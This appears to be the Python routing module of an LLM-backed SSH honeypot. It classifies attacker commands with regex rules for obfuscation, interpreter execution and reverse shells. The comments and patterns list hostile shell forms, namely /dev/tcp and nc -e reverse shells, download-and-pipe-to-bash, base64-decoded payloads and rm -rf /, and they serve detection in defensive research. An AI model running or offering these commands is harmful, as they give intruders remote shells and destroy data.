import re

import sys, os
_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _HERE)
from prompt.fi_manager import FIScorer
from config_loader import load_config

# Single shared scorer — FIScorer.score() is a pure function of the command
# text (hardcoded regex bands, no session state), so one module-level
# instance is safe to share across every session's classify() calls.
_scorer = FIScorer()

# ─── Editable routing config — config.yaml is the live source of truth ───────
# fi_routing/agents.*.enabled are read from config.yaml, not hardcoded here —
# an operator can hand-edit config.yaml (e.g. "0: cloud") and classify() will
# honor it immediately, no code change needed. Resolved via router.py's own
# file location (not cwd-relative "config.yaml") so this works regardless of
# which script imports router.py or what its working directory is.
_CONFIG_PATH = os.path.join(_HERE, "config.yaml")
try:
    _config = load_config(_CONFIG_PATH)
    _AGENTS_ENABLED = {
        "cowrie":    _config.agents.cowrie.enabled,
        "on_device": _config.agents.on_device.enabled,
        "cloud":     _config.agents.cloud.enabled,
    }
    _FI_ROUTING = {int(k): v for k, v in dict(_config.routing.fi_routing).items()}
    _FALLBACK   = _config.routing.fallback
except Exception:
    # config.yaml not found yet (e.g. router.py imported before `hp init`) —
    # fall back to today's 3-agent default so nothing breaks at import time
    _AGENTS_ENABLED = {"cowrie": True, "on_device": True, "cloud": True}
    _FI_ROUTING = {0: "cowrie", 1: "cowrie", 2: "on_device", 3: "on_device", 4: "on_device"}
    _FALLBACK   = "cowrie"

# capability rank, weakest to strongest — used only as a fallback when the
# configured target for a band isn't actually enabled, or cloud/on_device is
# unavailable for a mechanism-based override (obfuscation / COWRIE_UNIMPLEMENTED)
_RANK = {"cowrie": 0, "on_device": 1, "cloud": 2}


def _strongest(agents: list) -> str:
    return max(agents, key=lambda a: _RANK.get(a, -1)) if agents else "cowrie"

# ─── Group 0: Cowrie coverage gap ─────────────────────────────────────────────
# These binaries have no Python command-class handler in this Cowrie instance
# — invoking any of them always fails with the same generic fallback error
# ("cannot execute binary file: Exec format error"), regardless of arguments.
# Verified empirically against the live Cowrie connection (fresh connection
# per command, no session-state carryover): 70/161 declared base_tools were
# tested this way and every one of these failed 100% of the time (multiple
# tested with 4-29 real occurrences each in dataset/mrheinen_linux_commands.json
# ground truth, always failing). Since several of these would otherwise score
# an FI band that routes to cowrie (e.g. diff, ln, file, stat, arp, ip), this
# check must run BEFORE the FI-band lookup so these specific binaries route
# to on_device instead — any LLM-fabricated answer is strictly better than a
# guaranteed-wrong error.
COWRIE_UNIMPLEMENTED = {
    "arch", "arp", "basename", "blkid", "cal", "cmp", "column", "comm",
    "diff", "dirname", "expr", "fdisk", "file", "findmnt", "flock", "fold",
    "getent", "getopt", "gpg", "hexdump", "install", "ionice", "ip", "kmod",
    "laptop-detect", "lastlog", "linux-version", "ln", "lnstat", "logger",
    "logname", "lsblk", "lsusb", "mkfifo", "mktemp", "mountpoint", "namei",
    "nice", "nl", "nstat", "paste", "pgrep", "pmap", "printenv", "pwdx",
    "readlink", "renice", "rev", "route", "routel", "rpcinfo", "seq",
    "split", "ss", "ssh-keygen", "stat", "sysctl", "tac", "taskset", "tc",
    "tempfile", "test", "timeout", "tload", "traceroute", "truncate", "tty",
    "vdir", "vmstat", "whereis",
}


# The inverse of COWRIE_UNIMPLEMENTED: commands Cowrie performs FOR REAL, so
# routing them anywhere else makes the honeypot less convincing, not more.
#
# Cowrie opens the socket, fetches the bytes, and registers the file in its
# filesystem. CowrieAgent holds ONE persistent shell per attacker session, so
# a later `cat` (FI 0 -> cowrie) reads that same filesystem and returns the
# real content. Verified 2026-08-31 against the live backend:
#
#     $ wget https://.../README.md   ->  Saving to: `/root/README.md'
#     $ ls -la README.md             ->  -rw-r--r-- 1 root root 5278 ...
#     $ cat /root/README.md          ->  # ATT&CK(R) STIX Data ...
#
# Their FI band is 3 (Download), which fi_routing sends to on_device. The LLM
# then writes a flawless transfer log and saves nothing, so the attacker's next
# `cat` says "No such file or directory" — a giveaway in two commands.
#
# Only wget and curl are listed. Cowrie also ships tftp and ftpget, but there
# was no local TFTP/FTP server to verify them against, and an unverified entry
# here would silently route a command to an agent that cannot handle it.
COWRIE_AUTHORITATIVE = {"wget", "curl"}


def _base_cmd(cmd: str) -> str:
    stripped = cmd.strip()
    return stripped.split()[0] if stripped else ""


# ─── Cowrie vs on_device: driven by FI band, not pattern lists ───────────────
# Which of {cowrie, on_device} a non-cloud command routes to is now decided
# entirely by FIScorer's band for that command (see classify() below):
#   FI 0-1 → cowrie      (read/display, create file/install tool)
#   FI 2-3 → on_device   (modify/navigate/change shell, service/download/elevate)
# FI_RULES in prompt/fi_manager.py is the single source of truth for this —
# no separate pattern lists here anymore. Any command previously routed by
# BASIC_PATTERNS/ONDEVICE_PATTERNS now needs its FI band correct in FI_RULES
# instead of a duplicate regex here.
# ─── Group 3: Cloud LLM ──────────────────────────────────────────────────────
# Routes commands requiring SEMANTIC RECONSTRUCTION OF EXECUTION INTENT —
# the real action cannot be determined without decoding, evaluating, or
# reconstructing the payload from its indirect or encoded form.
#
# Design principle: cloud routing is about SEMANTIC RECONSTRUCTION, not impact.
#   eval $(echo whoami)                      → FI 0, CLOUD     (intent hidden)
#   python3 -c "import os; os.system('id')" → FI 0, CLOUD     (intent hidden)
#   python3 -c "print(123)"                 → FI 0, ON-DEVICE  (intent explicit)
#   rm -rf /                                → FI 4, NOT CLOUD  (intent explicit)
#
# Rules are grouped by the shell mechanism that obscures semantic intent.
# No entropy thresholds or operator counts are used — every rule is anchored
# to a concrete, nameable shell behaviour citable in a research paper.

# ── Helpers ───────────────────────────────────────────────────────────────────

# Execution-intent keywords: presence inside an interpreter payload indicates
# the one-liner is attempting to run system commands, not just compute.
_EXEC_INTENT = (
    r'os\.system\s*\('
    r'|os\.execute\s*\('              # Lua: os.execute("/bin/sh")
    r'|subprocess\.'
    r'|pty\.spawn\s*\('
    r'|\bpopen\s*\('
    r'|\bsystem\s*\('
    r'|\bexecl?\s*\('
    r'|\bexecvp?\s*\('
    r'|\bspawn\s*\('
    r'|socket\.socket\s*\('           # reverse shell scaffolding
    r'|connect\s*\(\s*\('             # socket.connect((...))
    r"|dup2\s*\("                     # fd redirect in rev-shell
    r'|TCPSocket\b'                   # Ruby reverse shell
    r'|Net::Socket\b'                 # Perl reverse shell
    r'|use\s+Socket\b'                # Perl socket import
    r'|require\s*\(\s*["\']child_process["\']'  # Node.js exec
    r'|\bexec\s*\(["\']'              # exec("cmd") inside interpreter
    r'|\bexec\s+["\'/]'               # exec "/bin/sh" bare form (Ruby/Perl)
    r'|\beval\s*\('                   # eval() inside interpreter payload
)

# Network-fetch prefixes: when these appear before a pipe, the pipe-to-interpreter
# is loading a remote payload — not processing a local file.
_NET_FETCH = r'(curl|wget|busybox\s+wget|fetch|lwp-download)\b'

# ── Category A: Indirect execution ───────────────────────────────────────────
# The outer shell delegates execution to a subshell or interpreter whose
# argument string hides the real command. A reasoner must evaluate the
# argument to reconstruct intent.
#
# Refinements:
#   eval:        kept unconditional — any eval requires semantic reconstruction
#   exec:        restricted to network FD redirection; plain `exec ls` is transparent
#   bash/sh -c:  only escalate when the argument contains a subshell, encoding,
#                or decoding operation — `bash -c 'ls'` is explicit and handled
#                by Cowrie/on-device

_INDIRECT = [
    # eval always hides intent — the argument must be evaluated before intent is known
    r'\beval\b',

    # exec opening a network file descriptor — `exec 5<>/dev/tcp/...`
    # NOT triggered by `exec ls` or `exec bash`
    r'\bexec\s+\d+[<>]',

    # bash -c / sh -c only when the argument contains subshell substitution,
    # backticks, or a decoding pipeline — these hide what -c actually runs
    r'(?:bash|sh)\s+-c\b.*\$\(',
    r'(?:bash|sh)\s+-c\b.*`[^`]+`',
    r'(?:bash|sh)\s+-c\b.*base64\s+-d',
    r'(?:bash|sh)\s+-c\b.*base64\s+--decode',
    r'(?:bash|sh)\s+-c\b.*xxd\s+-r',
    r'(?:bash|sh)\s+-c\b.*openssl\b.*-d\b',
]

# ── Category B: Encoding / decoding ──────────────────────────────────────────
# The payload is in an encoded form opaque to static reading.
# Decoding is required before content — and therefore intent — is known.

_DECODING = [
    r'base64\s+-d',                      # echo <b64> | base64 -d | ...
    r'base64\s+--decode',                # GNU long form
    r'openssl\s+enc\b.*-d\b',           # openssl enc -d -aes-256-cbc ...
    r'openssl\s+base64\s+-d',           # openssl base64 -d
    r'xxd\s+-r',                         # xxd -r -p  (hex → binary)
    r'(\\x[0-9a-fA-F]{2}){3,}',         # \x63\x61\x74 hex escape runs
    r"printf\s+['\"]?(\\\\x[0-9a-fA-F]{2}){3,}",  # printf '\x63\x61\x74'
]

# ── Category C: Dynamic shell evaluation ─────────────────────────────────────
# The command to execute is constructed at runtime. The outer shell cannot
# know what will run until it evaluates the inner expression.
#
# Refinement: $(...) and backticks are only escalated when:
#   (a) the substitution result IS the command (bare subshell)
#   (b) the substitution feeds into execution via a pipe
#   (c) the subshell contains execution-intent keywords
#   Simple argument substitutions (`ls $(pwd)`) are NOT escalated.

_DYNAMIC = [
    # Bare subshell as the entire command
    r'^\s*\$\([^)]+\)\s*$',
    r'^\s*`[^`]+`\s*$',

    # Subshell result piped into execution
    r'\$\([^)]+\)\s*\|',
    r'`[^`]+`\s*\|',

    # Subshell wrapping an interpreter one-liner with execution intent
    rf'\$\(.*(?:{_EXEC_INTENT}).*\)',
    rf'`.*(?:{_EXEC_INTENT}).*`',

    # Variable-splitting: $a$b trick to reconstruct a command name at runtime
    r'\$[a-zA-Z_]\w*\$[a-zA-Z_]\w*',
]

# ── Category D: Interpreter-mediated execution ───────────────────────────────
# An interpreter is invoked with an inline payload that contains
# execution-intent primitives. Intent is buried inside a string argument
# rather than expressed as a plain shell command — semantic reconstruction
# is required to determine what will run.
#
# Refinement: interpreter -c alone does NOT trigger cloud. The payload must
# also contain an execution-intent keyword so that:
#   python3 -c "print(123)"                  → ON-DEVICE (no exec intent)
#   python3 -c "import os; os.system('id')" → CLOUD     (exec intent present)
#
# Also added: find -exec sh, xargs sh, awk system(), rpm lua eval.

_INTERPRETER = [
    # Interpreter one-liners with execution intent in the payload
    rf'python3?\s+-c\b.*(?:{_EXEC_INTENT})',
    rf'perl\s+-e\b.*(?:{_EXEC_INTENT})',
    rf'ruby\s+-e\b.*(?:{_EXEC_INTENT})',
    rf'node\s+-e\b.*(?:{_EXEC_INTENT})',
    rf'php\s+-r\b.*(?:{_EXEC_INTENT})',
    rf'lua\s+-e\b.*(?:{_EXEC_INTENT})',

    # awk / tclsh with system() call
    r'\bawk\b.*\bsystem\s*\(',          # awk '{system("sh")}' or BEGIN{system(...)}
    r'\btclsh\b.*\beval\b',             # tclsh: eval exec id

    # find delegating execution to a shell
    r'\bfind\b.*-exec\s+(bash|sh)\b',   # find / -exec bash -c '...' \;
    r'\bfind\b.*-exec\s+\S*sh\b',       # find / -exec /bin/sh \;

    # xargs delegating to a shell
    r'\bxargs\b.*(bash|sh)\s+-c\b',     # xargs bash -c '...'
    r'\bxargs\b.*\b(bash|sh)\b\s*$',    # ... | xargs bash

    # rpm lua eval
    r'\brpm\b.*--eval\b.*\blua\b',
]

# ── Category E: Pipe-to-interpreter ──────────────────────────────────────────
# A payload is streamed into an interpreter. Only escalated when the SOURCE
# is a network fetch or a decoding operation — making the executed content
# invisible in the command. Local-file pipes (`cat file.py | python3`) are NOT
# escalated since the content is statically present on disk.

_PIPE_TO_INTERP = [
    # Network fetch piped into a shell or interpreter
    rf'{_NET_FETCH}[^|]*\|\s*(bash|sh|python3?|perl|ruby|php|node)\b',

    # Decoded payload piped into execution
    r'base64\s+(-d|--decode)[^|]*\|\s*(bash|sh|python3?|perl|ruby)\b',
    r'xxd\s+-r[^|]*\|\s*(bash|sh|python3?|perl|ruby)\b',
    r'openssl\b[^|]*-d\b[^|]*\|\s*(bash|sh|python3?|perl|ruby)\b',
]

# ── Category F: Reverse-shell primitives ─────────────────────────────────────
# These constructs open a raw bidirectional network channel back to an attacker.
# Cowrie and the on-device model cannot meaningfully emulate these.

_REVERSE_SHELL = [
    r'/dev/tcp/',                        # bash -i >& /dev/tcp/ip/port 0>&1
    r'/dev/udp/',                        # sh -i >& /dev/udp/ip/port 0>&1
    r'\bmkfifo\b',                       # mkfifo /tmp/f; cat /tmp/f | nc ...
    r'\bsocat\b',                        # socat exec:'bash -li',...
    r'\bnc\b.*-e\b',                    # nc -e /bin/sh ip port
    r'\bncat\b.*-e\b',                  # ncat -e /bin/bash ip port
]

# ── Combined check ────────────────────────────────────────────────────────────

def _is_cloud(cmd: str) -> bool:
    """
    Return True when the command requires cloud LLM reasoning because its
    real execution intent cannot be determined without semantic reconstruction
    — i.e. without decoding, evaluating, or re-assembling an indirect payload.

    All rules are anchored to a concrete, nameable shell mechanism.
    No entropy thresholds or operator-count heuristics are used.
    """
    all_rules = (
        _INDIRECT
        + _DECODING
        + _DYNAMIC
        + _INTERPRETER
        + _PIPE_TO_INTERP
        + _REVERSE_SHELL
    )
    return any(re.search(pattern, cmd) for pattern in all_rules)


# ─── Classifier ──────────────────────────────────────────────────────────────

def classify(cmd: str, session_history: list) -> str:
    cmd = cmd.strip()

    enabled = [a for a in ("cowrie", "on_device", "cloud") if _AGENTS_ENABLED.get(a, True)]
    if not enabled:
        enabled = ["cowrie"]   # safety net — should never happen, but never route nowhere

    # Single-agent mode: HoneyRouter has no choice to make — everything goes
    # to the one agent that's actually enabled, no exceptions.
    if len(enabled) == 1:
        return enabled[0]

    # Cloud first — requires semantic reconstruction of execution intent.
    # If cloud is disabled, fall back to the strongest remaining agent rather
    # than silently losing the obfuscation-detection signal entirely.
    if _is_cloud(cmd):
        return 'cloud' if 'cloud' in enabled else _strongest(enabled)

    # Cowrie coverage gap — this binary always fails on Cowrie regardless of
    # arguments, so never route it there even though its FI band would
    # otherwise send it to cowrie. Specifically on_device, not "whatever's
    # strongest" — these are ordinary low-impact commands Cowrie just can't
    # execute, not commands that need cloud-grade semantic reconstruction;
    # sending them to cloud would be an expensive, unintended escalation.
    if _base_cmd(cmd) in COWRIE_UNIMPLEMENTED:
        if "on_device" in enabled:
            return "on_device"
        return _strongest([a for a in enabled if a != "cowrie"])

    # Cowrie does this one for real — see COWRIE_AUTHORITATIVE. Checked AFTER
    # the obfuscation test above, so `wget http://x/p.sh | base64 -d | sh`
    # still escalates to cloud; only a plain transfer is handed to Cowrie.
    if _base_cmd(cmd) in COWRIE_AUTHORITATIVE and "cowrie" in enabled:
        return "cowrie"

    # FI band decides the rest — via config.yaml's fi_routing table (see
    # prompt/fi_manager.py for the FI score itself; fi_routing for which
    # agent each band maps to, fully hand-editable). Falls back to the
    # strongest enabled agent if the configured target isn't actually
    # available (e.g. hand-edited to an agent that got disabled since).
    fi, _ = _scorer.score(cmd)
    target = _FI_ROUTING.get(fi, _FALLBACK)
    return target if target in enabled else _strongest(enabled)


if __name__ == "__main__":
    test_cmds = ["hello", "hey", "hi", "wtf", "what"]
    for cmd in test_cmds:
        result = classify(cmd, [])
        fi, method = _scorer.score(cmd)
        print(f"{cmd!r} → {result}  (FI={fi}, {method})")